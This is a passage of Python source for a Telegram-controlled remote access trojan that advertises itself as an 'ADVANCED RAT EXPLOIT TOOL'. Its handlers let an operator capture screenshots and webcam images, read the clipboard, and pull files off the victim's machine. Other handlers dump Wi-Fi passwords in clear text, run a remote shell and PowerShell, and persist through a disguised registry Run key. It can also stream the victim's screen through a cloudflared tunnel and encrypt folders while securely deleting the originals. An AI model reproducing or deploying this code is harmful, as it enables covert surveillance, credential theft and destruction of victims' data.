                    # Monitor is taller than target
                    new_height = target_height
                    new_width = int(target_height * aspect_ratio)
                
                # Resize frame maintaining aspect ratio
                frame = cv2.resize(frame, (new_width, new_height))
                
                # Convert from BGRA to BGR (OpenCV format)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                
                # Apply slight sharpening for better quality
                kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
                frame = cv2.filter2D(frame, -1, kernel)
                
                # Add black borders if needed to maintain target size
                if new_width != target_width or new_height != target_height:
                    # Create black background
                    background = np.zeros((target_height, target_width, 3), dtype=np.uint8)
                    
                    # Calculate position to center the frame
                    y_offset = (target_height - new_height) // 2
                    x_offset = (target_width - new_width) // 2
                    
                    # Place frame in center of background
                    background[y_offset:y_offset+new_height, x_offset:x_offset+new_width] = frame
                    frame = background
                
                # Encode frame to JPEG with quality-based compression
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), settings['jpeg_quality']]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                frame_bytes = buffer.tobytes()
                
                # Yield frame for streaming
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n')
                
                # Delay based on quality setting
                time.sleep(settings['interval'])
                
            except Exception as e:
                print(f"Web stream error: {e}")
                time.sleep(0.1)


def web_stream_worker():
    """Background worker for web streaming"""
    global web_stream_active
    
    print(f"Web streaming started at http://{local_ip}:{web_port}")
    print("Starting Flask web server...")
    print(f"Server will be available at: http://localhost:{web_port}")
    print("Use cloudflared tunnel --url http://localhost:8080 to expose this server")
    
    try:
        # Start Flask app with proper configuration for cloudflared
        app.run(host='0.0.0.0', port=web_port, debug=False, use_reloader=False, threaded=True)
    except Exception as e:
        print(f"Flask error: {e}")
    
    print("Web streaming stopped")


@bot.message_handler(commands=['start'])
def start(message):
    welcome_text = """
🚀 WELCOME TO ADVANCED RAT EXPLOIT TOOL

🎯 Developed by: @vashu0100
⚡ Status: Online & Ready

💡 Quick Access Commands:
/menu - Main feature menu
/help - Detailed command list
/screen - Capture screenshot
/webcam - Take webcam photo
/sys - System information
/ip - Get IP address
/shell - Remote shell access
/powershell - PowerShell interface
/livescreen - Live screen streaming
/startup - Auto-start on boot

🛡️ Security Features:
• Real-time monitoring
• Encrypted communications
• Stealth operation
• Anti-detection measures

Type /menu to see all available features!
"""
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(commands=['menu'])
def menu_command(message):
    menu_text = """
🎯 MAIN FEATURE MENU

🔍 SYSTEM & INFORMATION:
/sys - System details
/ip - Public IP address
/screen - Screenshot capture
/webcam - Webcam photo
/clipboard - Get clipboard content

📁 FILE MANAGEMENT:
/ls - List directory contents
/cd [path] - Change directory
/upload [path] - Download file
/crypt [path] - Encrypt files/folders
/decrypt [path] - Decrypt files/folders

💻 REMOTE ACCESS:
/shell - Remote command shell
/powershell - PowerShell interface
/wifi - Get WiFi passwords
/startup - Add to Windows startup

🎥 LIVE STREAMING:
/livescreen - Telegram live screen
/stoplivescreen - Stop streaming
/livescreenstatus - Stream status
/webstream - Web-based viewer
/stopwebstream - Stop web stream
/webstatus - Web stream status
/cloudflared - Public tunnel

⌨️ MONITORING:
/keystroke - Start keylogger
/keystop - Stop & get logs
/keystatus - Logger status

🛡️ SYSTEM CONTROL:
/lock - Lock computer
/shutdown - Shutdown system
/speech [text] - Text to speech

❓ HELP & SUPPORT:
/help - Detailed command help
/start - Welcome message
"""
    bot.send_message(message.chat.id, menu_text)

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = """
📖 DETAILED COMMAND REFERENCE

🎯 SYSTEM INFORMATION:
/sys - Get detailed system information including OS, CPU, memory
/ip - Retrieve public IP address
/screen - Capture and send screenshot
/webcam - Take photo from webcam
/clipboard - Get current clipboard content

📁 FILE OPERATIONS:
/ls - List files and folders in current directory
/cd [path] - Navigate to specified directory (e.g., /cd C:\\Users)
/upload [path] - Download file from target system (e.g., /upload C:\\file.txt)
/crypt [path] - Encrypt files/folders with AES encryption
/decrypt [path] - Decrypt previously encrypted files

💻 REMOTE ACCESS:
/shell - Enter remote shell mode for command execution
/powershell - Access PowerShell with elevated privileges
/wifi - Extract saved WiFi passwords (Windows)
/startup - Automatically start program on Windows boot

🎥 LIVE SCREEN STREAMING:
/livescreen - Start live screen streaming to Telegram (1 FPS)
/stoplivescreen - Stop Telegram live screen streaming
/livescreenstatus - Check current streaming status

🌐 WEB-BASED VIEWING:
/webstream - Start web server for browser-based screen viewing
/stopwebstream - Stop web streaming server
/webstatus - Check web server status
/geturl - Get local streaming URL
/cloudflared - Create public tunnel for remote access

⌨️ KEYSTROKE MONITORING:
/keystroke - Start capturing all keystrokes
/keystop - Stop keylogger and send captured data
/keystatus - Check keylogger status and statistics

🛡️ SYSTEM CONTROL:
/lock - Lock the target computer screen
/shutdown - Shutdown target system in 5 seconds
/speech [text] - Convert text to speech on target

💡 TIPS:
• Use /menu for organized feature list
• Type 'exit' when in /shell or /powershell mode
• All communications are encrypted for security
• Live streaming works in real-time

⚡ Developed by @vashu0100
"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['screen'])
def send_screen(message):
    with mss.mss() as sct:
        sct.shot(output=f"{cd}\\capture.png")
                              
    image_path = f"{cd}\\capture.png"
    print(image_path)
    with open(image_path, "rb") as photo:
        bot.send_photo(message.chat.id, photo)
   

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, 'error')

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.send_message(message.chat.id, system_info_text)


@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "folder is empty.")
        else:
            response = "Directory content :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"you are in : {cd}")
            else:
                bot.send_message(message.chat.id, f"The directory does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. : USE /cd [folder name]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path):
           
                with open(file_path, 'rb') as file:
                  
                    bot.send_document(message.chat.id, file)

                bot.send_message(message.chat.id, f"File has been transferred successfully.")
            else:
                bot.send_message(message.chat.id, "The specified path does not exist.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /upload [PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "fuckyou"

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                  
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                   
                    if not file_path.endswith('.crypt'):
                       
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder encrypted, and original non-encrypted files securely deleted successfully.")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /crypt [FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
       
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "fuckyou"
      
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6] 
                       
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
                        
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Folder decrypted, and encrypted files deleted successfully..")
        else:
            bot.send_message(message.chat.id, "Incorrect command usage. Use /decrypt [ENCRYPTED_FOLDER_PATH]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:

        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            bot.send_message(message.chat.id, "windows session succefuly locked.")
        else:
            bot.send_message(message.chat.id, "Impossible to lock windows session.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        
        if success:
            bot.send_message(message.chat.id, "shutdown in 5 seconds.")
        else:
            bot.send_message(message.chat.id, "Impossible to shutdown.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        
        cap = cv2.VideoCapture(0)

    
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Error: Unable to open the webcam.")
        else:
            
            ret, frame = cap.read()

            if ret:
                
                cv2.imwrite("webcam.jpg", frame)

              
                with open("webcam.jpg", 'rb') as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)
                
                os.remove("webcam.jpg")  
            else:
                bot.send_message(message.chat.id, "Error while capturing the image.")

        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


@bot.message_handler(commands=['startup'])
def add_to_startup(message):
    """Add the current executable to Windows startup registry"""
    try:
        import winreg
        
        # Get the current executable path
        exe_path = os.path.abspath(sys.argv[0])
        
        # Registry key for startup programs
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = "WindowsSystemService"
        
        try:
            # Open the registry key
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            
            # Set the registry value
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
            
            success_message = f"""✅ SUCCESSFULLY ADDED TO STARTUP!

📁 Executable: {os.path.basename(exe_path)}
📍 Path: {exe_path}
🔑 Registry Key: HKEY_CURRENT_USER\\{key_path}
🏷️ Value Name: {value_name}

🚀 The program will now start automatically when Windows boots
💡 No additional configuration needed
⚠️ To remove from startup, delete the registry entry manually
"""
            bot.send_message(message.chat.id, success_message)
            
        except PermissionError:
            bot.send_message(message.chat.id, "❌ Permission denied. Run as administrator to add to startup.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error adding to startup: {str(e)}")
            
    except ImportError:
        bot.send_message(message.chat.id, "❌ This feature is only available on Windows systems.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Unexpected error: {str(e)}")

@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "succesful say.")
        else:
            bot.send_message(message.chat.id, "Use like this. Utilisez /speech [TEXTE]")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
      
        clipboard_text = clipboard.paste()

        if clipboard_text:
          
            bot.send_message(message.chat.id, f"Clipboard content :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "clipboard is empty.")
    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


user_states = {}


STATE_NORMAL = 1
STATE_SHELL = 2
STATE_POWERSHELL = 3

@bot.message_handler(commands=['shell'])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "You are now in the remote shell interface. Type 'exit' to exit.")

@bot.message_handler(commands=['powershell'])
def start_powershell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_POWERSHELL
    bot.send_message(user_id, "You are now in PowerShell with root privileges. Type 'exit' to exit.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting remote shell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            # Use the new function that handles interactive prompts like msstore agreement
            stdout, stderr = execute_command_with_input_handling(command, timeout=30)

            if stdout:
                output = stdout
                send_long_message(user_id, f"Command output:\n{output}")
            if stderr:
                error_output = stderr
                send_long_message(user_id, f"Command error output:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_POWERSHELL)
def handle_powershell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Exiting PowerShell interface.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            # Execute PowerShell command with root privileges
            # On Windows, we use powershell.exe
            # On Unix-like systems, we use pwsh if available, otherwise fallback to shell
            if platform.system() == "Windows":
                # Windows PowerShell
                full_command = f"powershell.exe -Command \"{command}\""
            else:
                # Unix-like systems - try PowerShell Core first, then fallback
                if shutil.which("pwsh"):
                    full_command = f"pwsh -Command \"{command}\""
                else:
                    # Fallback to regular shell but simulate PowerShell-like output
                    full_command = command
            
            stdout, stderr = execute_command_with_input_handling(full_command, timeout=30)

            if stdout:
                output = stdout
                send_long_message(user_id, f"PS > {command}\n{output}")
            if stderr:
                error_output = stderr
                send_long_message(user_id, f"PS Error > {command}\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"An error occurred: {str(e)}")

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

def send_long_message(user_id, message_text):
    if not message_text or len(message_text.strip()) == 0:
        bot.send_message(user_id, "No output to display.")
        return
        
    part_size = 3500  # Reduced to stay well under Telegram's 4096 character limit
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]

    for part in message_parts:
        try:
            bot.send_message(user_id, part)
            time.sleep(0.1)  # Small delay to avoid rate limiting
        except Exception as e:
            bot.send_message(user_id, f"Error sending message part: {str(e)}")


def execute_command_with_input_handling(command, timeout=30):
    """
    Execute a command with proper handling for interactive prompts like msstore agreement.
    This function detects prompts and automatically responds with 'Y' to common agreement prompts.
    """
    try:
        # Create a process with stdin, stdout, and stderr pipes
        process = subprocess.Popen(
            command,
            shell=True,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            universal_newlines=True
        )
        
        # Send 'Y' response to the process stdin to handle prompts like msstore agreement
        stdout, stderr = process.communicate(input='Y\n', timeout=timeout)
        
        # Return the combined output
        return stdout, stderr
        
    except subprocess.TimeoutExpired:
        # If timeout occurs, kill the process and return what we have
        process.kill()
        try:
            stdout, stderr = process.communicate()
            return stdout, stderr
        except:
            return "", "Process timed out and was terminated"
    except Exception as e:
        return "", f"Error executing command: {str(e)}"


def run_cloudflared_tunnel(chat_id, local_port=8080):
    """
    Run cloudflared tunnel and send the public URL to Telegram
    """
    try:
        # First, check if cloudflared is installed
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
        if result.returncode != 0:
            bot.send_message(chat_id, "❌ cloudflared is not installed. Please install it first.")
            return
        
        # Run cloudflared tunnel as a subprocess
        cmd = f'cloudflared tunnel --url http://localhost:{local_port}'
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Redirect stderr to stdout
            universal_newlines=True,
            bufsize=1
        )
        
        # Read the output line by line to capture the tunnel URL
        tunnel_url = None
        for line in process.stdout:
            line = line.strip()
            print(line)  # Print to console for debugging
            
            # Look for the tunnel URL in the output
            if "trycloudflare.com" in line and "INF" in line:
                # Extract URL from the log line
                import re
                url_match = re.search(r'https://[\w\-.]+\.trycloudflare\.com', line)
                if url_match:
                    tunnel_url = url_match.group(0)
                    # Send the URL to Telegram
                    bot.send_message(chat_id, f"🌐 CLOUDFLARED TUNNEL CREATED SUCCESSFULLY!\\n\\n🔗 Public URL: {tunnel_url}\\n\\n📱 Share this link to access the live screen remotely\\n⚠️ This tunnel is temporary and will expire")
                    break  # Exit after finding the URL
            
            # If process terminates before finding URL
            if process.poll() is not None:
                break
        
        # Close the process
        process.wait()
        
        if not tunnel_url:
            bot.send_message(chat_id, "❌ Could not get tunnel URL. Check if cloudflared is working properly.")
            
    except FileNotFoundError:
        bot.send_message(chat_id, "❌ cloudflared command not found. Make sure it's installed and in PATH.")
    except Exception as e:
        bot.send_message(chat_id, f"❌ Error running cloudflared: {str(e)}")


@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)

        
        with open('Wi-Fi-App.xml', 'r') as file:
            xml_content = file.read()

      
        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)

        if ssid_match and password_match:
            ssid = ssid_match.group(1)
            password = password_match.group(1)

            message_text = f"SSID: {ssid}\nPASS: {password}"
            bot.send_message(message.chat.id, message_text)
            try:
                os.remove("Wi-Fi-App.xml")
            except:
                pass
        else:
            bot.send_message(message.chat.id, "NOT FOUND.")

    except Exception as e:
        bot.send_message(message.chat.id, f"An error occurred : {str(e)}")


# Live Screen Video Streaming Functions
def create_video_stream():
    """Create a continuous video stream from screen captures"""
    global live_screen_active, live_screen_users
    
    # Video settings for smooth streaming
    fps = 15  # 15 FPS for smooth video
    frame_width = 1280  # HD resolution
    frame_height = 720
    
    # Initialize video writer
    output_path = f"{cd}/live_stream.mp4"
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter(output_path, fourcc, fps, (frame_width, frame_height))
    
    with mss.mss() as sct:
        # Set monitor to capture
        monitor = sct.monitors[1]  # Primary monitor
        
        while live_screen_active:
            try:
                # Capture screen
                screenshot = sct.grab(monitor)
                
                # Convert to numpy array
                frame = np.array(screenshot)
                
                # Resize to target resolution
                frame = cv2.resize(frame, (frame_width, frame_height))
                
                # Convert from BGRA to BGR (OpenCV format)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                
                # Write frame to video
                out.write(frame)
                
                # Small delay for smooth video
                time.sleep(1/fps)
                
            except Exception as e:
                print(f"Video stream error: {e}")
                time.sleep(0.1)
    
    # Clean up
    out.release()
    print("Video stream stopped")


def live_screen_worker():
    """Worker thread for live screen video streaming"""
    global live_screen_active, live_screen_users
    
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Primary monitor
        
        while live_screen_active:
            try:
                # Capture screen at high frequency
                screenshot = sct.grab(monitor)
                
                # Convert to numpy array and resize for faster processing
                frame = np.array(screenshot)
                frame = cv2.resize(frame, (640, 480))  # Smaller size for faster streaming
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                
                # Encode frame to JPEG with high quality
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 85]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                
                # Convert to bytes
                frame_bytes = buffer.tobytes()
                
                # Send to all watching users
                for user_id in list(live_screen_users):
                    try:
                        # Send as document for better quality
                        bot.send_document(user_id, frame_bytes, 
                                        caption=f"🖥️ LIVE STREAM - {time.strftime('%H:%M:%S.%f')[:-3]}")
                    except Exception as e:
                        print(f"Error sending to user {user_id}: {e}")
                        live_screen_users.discard(user_id)
                
                # Very short delay for smooth streaming
                time.sleep(0.1)  # 100ms = 10 FPS
                
            except Exception as e:
                print(f"Live stream error: {e}")
                time.sleep(0.1)
    
    print("Live screen streaming stopped")


@bot.message_handler(commands=['livescreen'])
def start_live_screen(message):
    """Start live screen streaming - sends screenshots every second via Telegram"""
    global live_screen_active, live_screen_thread, live_screen_users
    
    user_id = message.from_user.id
    
    if not live_screen_active:
        live_screen_active = True
        live_screen_users.add(user_id)
        live_screen_thread = threading.Thread(target=telegram_live_screen_worker, daemon=True)
        live_screen_thread.start()
        
        bot.send_message(user_id, f"🟢 LIVE SCREEN STREAMING STARTED!\n📸 Screenshots every 1 second\n🎯 Full HD quality (1920x1080)\n📱 High-quality images sent to Telegram\n⚠️ Use /stoplivescreen to stop")
    else:
        live_screen_users.add(user_id)
        bot.send_message(user_id, f"🟢 You're now watching LIVE SCREEN!\n📸 Screenshots every 1 second\n🎯 Full HD quality\n📱 High-quality images in Telegram")


@bot.message_handler(commands=['stoplivescreen'])
def stop_live_screen(message):
    """Stop live screen streaming for current user"""
    global live_screen_active, live_screen_thread, live_screen_users
    
    user_id = message.from_user.id
    
    if user_id in live_screen_users:
        live_screen_users.discard(user_id)
        bot.send_message(user_id, "🔴 Live screen streaming stopped for you.")
        
        # If no more users watching, stop the service
        if not live_screen_users:
            live_screen_active = False
            if live_screen_thread and live_screen_thread.is_alive():
                live_screen_thread.join(timeout=1)
            bot.send_message(user_id, "🛑 Live screen streaming service stopped (no more viewers).")
    else:
        bot.send_message(user_id, "❌ You are not currently watching live screen.")


@bot.message_handler(commands=['livescreenstatus'])
def live_screen_status(message):
    """Check live screen streaming status"""
    user_id = message.from_user.id
    
    if live_screen_active:
        viewer_count = len(live_screen_users)
        is_watching = user_id in live_screen_users
        status_text = f"🟢 LIVE SCREEN STREAMING ACTIVE\n👥 Viewers: {viewer_count}\n📸 Screenshots: Every 1 second\n🎯 Quality: Full HD (1920x1080)\n📱 Delivery: High-quality Telegram images\n👁️ You are {'watching' if is_watching else 'not watching'}"
    else:
        status_text = "🔴 Live screen streaming is INACTIVE"
    
    bot.send_message(user_id, status_text)


def telegram_live_screen_worker():
    """Worker thread for Telegram live screen - sends screenshots every second"""
    global live_screen_active, live_screen_users
    
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Primary monitor
        
        while live_screen_active:
            try:
                # Capture full screen at high quality
                screenshot = sct.grab(monitor)
                
                # Convert to numpy array
                frame = np.array(screenshot)
                
                # Resize to Full HD for high quality
                frame = cv2.resize(frame, (1920, 1080))
                
                # Convert from BGRA to BGR (OpenCV format)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                
                # Apply sharpening for better quality
                kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
                frame = cv2.filter2D(frame, -1, kernel)
                
                # Encode to JPEG with maximum quality
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 95]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                frame_bytes = buffer.tobytes()
                
                # Save temporarily
                timestamp = int(time.time())
                temp_path = f"{cd}/live_screen_{timestamp}.jpg"
                
                with open(temp_path, 'wb') as f:
                    f.write(frame_bytes)
                
                # Send to all watching users
                for user_id in list(live_screen_users):
                    try:
                        with open(temp_path, "rb") as photo:
                            bot.send_photo(user_id, photo, caption=f"🖥️ LIVE SCREEN - {time.strftime('%H:%M:%S')}")
                    except Exception as e:
                        print(f"Error sending to user {user_id}: {e}")
                        live_screen_users.discard(user_id)
                
                # Clean up temp file
                try:
                    os.remove(temp_path)
                except:
                    pass
                
                # Wait 1 second before next screenshot
                time.sleep(1)
                
            except Exception as e:
                print(f"Live screen error: {e}")
                time.sleep(1)
    
    print("Telegram live screen worker stopped")


@bot.message_handler(commands=['setquality'])
def set_stream_quality(message):
    """Set the quality of the video stream - Only MAXIMUM quality available"""
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            quality = args[1].lower()
            
            if quality == "maximum":
                live_screen_interval = 0.01  # 100 FPS - Ultra smooth video
                bot.send_message(message.chat.id, "💫 Quality set to MAXIMUM (100 FPS) - Ultra smooth video streaming")
            else:
                bot.send_message(message.chat.id, "❌ Only MAXIMUM quality (100 FPS) is supported. Use: /setquality maximum")
        else:
            bot.send_message(message.chat.id, "❌ Use: /setquality maximum")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error setting quality: {str(e)}")


@bot.message_handler(commands=['streaminfo'])
def stream_info(message):
    """Get detailed information about the live video stream"""
    user_id = message.from_user.id
    
    if live_screen_active:
        fps = int(1 / live_screen_interval)
        viewer_count = len(live_screen_users)
        is_watching = user_id in live_screen_users
        
        info_text = f"📊 LIVE VIDEO STREAM INFORMATION\n"
        info_text += f"🎯 Status: ACTIVE\n"
        info_text += f"📺 Frame Rate: {fps} FPS\n"
        info_text += f"⏱️ Update Interval: {live_screen_interval:.3f}s\n"
        info_text += f"👥 Active Viewers: {viewer_count}\n"
        info_text += f"👁️ Your Status: {'Watching' if is_watching else 'Not Watching'}\n"
        info_text += f"🎥 Stream Type: Continuous Video Feed\n"
        info_text += f"🌐 Bandwidth: {'HIGH' if fps >= 10 else 'MEDIUM' if fps >= 5 else 'LOW'}\n"
        info_text += f"💡 Use /setquality to adjust performance"
        
        bot.send_message(user_id, info_text)
    else:
        bot.send_message(user_id, "🔴 No active live video stream. Use /livescreen to start.")


# Web-based Live Screen Streaming Commands
@bot.message_handler(commands=['webstream'])
def start_web_streaming(message):
    """Start web-based live screen streaming"""
    global web_stream_active, web_stream_thread
    
    try:
        if not web_stream_active:
            web_stream_active = True
            web_stream_thread = threading.Thread(target=web_stream_worker, daemon=True)
            web_stream_thread.start()
            
            # Wait a moment for the server to start
            time.sleep(2)
            
            stream_url = f"http://{local_ip}:{web_port}"
            response_text = f"🟢 WEB STREAMING STARTED!\n\n"
            response_text += f"🌐 Local Stream URL: {stream_url}\n"
            response_text += f"💻 Open this URL in any web browser\n"
            response_text += f"📱 Works on phone, tablet, or computer\n"
            response_text += f"🎥 Real-time live screen viewing\n\n"
            response_text += f"☁️ To make it publicly accessible:\n"
            response_text += f"   Run: cloudflared tunnel --url http://localhost:8080\n\n"
            response_text += f"⚠️ Use /stopwebstream to stop\n"
            response_text += f"📊 Use /webstatus to check status"
            
            bot.send_message(message.chat.id, response_text)
        else:
            bot.send_message(message.chat.id, "🟢 Web streaming is already active!")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error starting web stream: {str(e)}")


@bot.message_handler(commands=['stopwebstream'])
def stop_web_streaming(message):
    """Stop web-based live screen streaming"""
    global web_stream_active
    
    try:
        if web_stream_active:
            web_stream_active = False
            bot.send_message(message.chat.id, "🔴 Web streaming stopped successfully!")
        else:
            bot.send_message(message.chat.id, "❌ Web streaming is not currently active.")
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error stopping web stream: {str(e)}")


@bot.message_handler(commands=['webstatus'])
def web_stream_status(message):
    """Check web streaming status and get URL"""
    try:
        if web_stream_active:
            stream_url = f"http://{local_ip}:{web_port}"
            status_text = f"🟢 WEB STREAMING STATUS: ACTIVE\n\n"
            status_text += f"🌐 Stream URL: {stream_url}\n"
            status_text += f"💻 Open in web browser to view\n"
            status_text += f"🎥 Real-time live screen streaming\n"
            status_text += f"📱 Compatible with all devices\n\n"
            status_text += f"⚠️ Use /stopwebstream to stop"
        else:
            status_text = f"🔴 WEB STREAMING STATUS: INACTIVE\n\n"
            status_text += f"💡 Use /webstream to start\n"
            status_text += f"🌐 Will be available at: http://{local_ip}:{web_port}"
        
        bot.send_message(message.chat.id, status_text)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error checking web status: {str(e)}")


@bot.message_handler(commands=['geturl'])
def get_streaming_url(message):
    """Get the web streaming URL"""
    try:
        stream_url = f"http://{local_ip}:{web_port}"
        url_text = f"🌐 LIVE SCREEN STREAMING URL:\n\n"
        url_text += f"🔗 {stream_url}\n\n"
        url_text += f"💻 Open this URL in any web browser\n"
        url_text += f"📱 Works on all devices\n"
        url_text += f"🎥 Real-time live screen viewing\n\n"
        
        if web_stream_active:
            url_text += f"✅ Stream is ACTIVE - Ready to view!"
        else:
            url_text += f"⚠️ Stream is INACTIVE - Use /webstream to start"
        
        bot.send_message(message.chat.id, url_text)
        
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Error getting URL: {str(e)}")


@bot.message_handler(commands=['cloudflared'])
def start_cloudflared_tunnel(message):
    """Start cloudflared tunnel and send public URL to Telegram"""
    chat_id = message.chat.id
    
    if not web_stream_active:
        bot.send_message(chat_id, "⚠️ Web streaming must be started first. Use /webstream to start streaming.")
        return
    
    bot.send_message(chat_id, "🚀 Starting cloudflared tunnel... This may take a moment.")
    
    # Run cloudflared in a separate thread so it doesn't block the bot
    tunnel_thread = threading.Thread(target=run_cloudflared_tunnel, args=(chat_id, web_port), daemon=True)
    tunnel_thread.start()


def on_key_press(key):
    """Callback function for key press events"""
